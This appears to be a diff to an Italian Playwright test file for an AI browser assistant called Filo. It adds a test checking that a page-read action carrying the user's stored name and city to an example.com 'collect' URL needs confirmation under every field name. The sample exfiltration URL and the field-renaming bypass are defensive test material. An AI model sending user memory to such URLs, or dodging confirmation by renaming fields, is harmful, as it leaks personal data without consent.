@@ -136,7 +136,9 @@ test('A — cerca, apre la pagina, legge il numero e risponde con quello', async
   await activity.locator('.dash-activity-head').click();
   const body = activity.locator('.dash-activity-body');
   await expect(body.locator('.dash-activity-row', { hasText: 'Cerco sul web' })).toHaveCount(1);
-  await expect(body.locator('.dash-activity-row', { hasText: 'Leggo la pagina: Canone 2026' })).toHaveCount(1);
+  // Il sito davanti al titolo: il titolo lo scrive chi possiede la pagina, e da
+  // solo non dice dove Filo sia andato a leggere.
+  await expect(body.locator('.dash-activity-row', { hasText: /Leggo la pagina: 127\.0\.0\.1.*Canone 2026/ })).toHaveCount(1);
   await expect(activity.locator('.dash-activity-label')).toContainText('letto una pagina');
 
   const calls = await app.evaluate(() => globalThis.__calls);
@@ -207,4 +209,40 @@ test('B — un indirizzo della rete privata non si legge, e il modello lo sa', a
   expect(esito.content).not.toContain('<<<PAGINA_WEB>>>');
 
   await app.evaluate(() => { try { globalThis.__restore2?.(); } catch (_) {} });
+});
+
+test('C — un indirizzo che porta fuori i dati non si legge senza conferma, comunque si chiami il campo', async ({ app }) => {
+  test.setTimeout(60_000);
+  await newtabPage(app);
+  const esfiltra = 'https://example.com/collect?d=Mario_Rossi_Bologna';
+
+  await app.evaluate(async () => {
+    await globalThis.SN_FILO_MEMORY.setMemory({
+      PROFILO: 'Si chiama Mario Rossi, vive a Bologna.',
+      PREFERENZE: 'Tema scuro.',
+    });
+    // Nessuna richiesta esce: se la difesa cade, l'elenco lo registra.
+    const orig = globalThis.fetch;
+    globalThis.__restore3 = () => { globalThis.fetch = orig; };
+    globalThis.__contattati = [];
+    globalThis.fetch = async (u) => {
+      globalThis.__contattati.push(String(u));
+      return new Response('<html><body><main><p>ok</p></main></body></html>', {
+        status: 200, headers: { 'content-type': 'text/html; charset=utf-8' },
+      });
+    };
+  });
+
+  // Filo accetta l'indirizzo sotto più nomi di campo: la conferma deve valere
+  // per tutti, altrimenti basta cambiare nome per saltarla.
+  for (const campo of ['url', 'indirizzo', 'pagina']) {
+    const r = await app.evaluate((_e, { campo: c, u }) =>
+      globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', [c]: u }), { campo, u: esfiltra });
+    expect(r.executed, campo).toBe(false);
+    expect(r.needsConfirm, campo).toBe(2);
+    expect(String(r.describe || ''), campo).toContain(esfiltra);
+  }
+
+  expect(await app.evaluate(() => globalThis.__contattati)).toEqual([]);
+  await app.evaluate(() => { try { globalThis.__restore3?.(); } catch (_) {} });
 });
